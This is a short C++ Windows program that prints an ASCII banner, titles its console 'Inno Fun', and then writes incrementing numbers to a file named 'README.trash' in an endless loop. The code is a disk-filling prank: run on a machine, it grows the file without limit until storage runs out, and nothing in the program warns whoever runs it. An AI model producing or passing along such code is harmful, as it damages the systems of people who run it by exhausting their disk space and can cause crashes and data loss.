#include <iostream>
#include <Windows.h>
#include <fstream>

using namespace std;

int main()
{
	cout << " _                           .____             " << endl;
	cout << " | , __   , __     __.       /     ,   . , __  " << endl;
	cout << " | |'  `. |'  `. .'   \      |__.  |   | |'  `." << endl;
	cout << " | |    | |    | |    |      |     |   | |    |" << endl;
	cout << " / /    | /    |  `._.'      /     `._/| /    |" << endl;
	cout << "                                               " << endl;

	SetConsoleTitleA("Inno Fun");

	int value = 1;
	ofstream trash;
	trash.open("README.trash");
	while (true)
	{
		trash << value;
		value++;
	}
	trash.close();

}
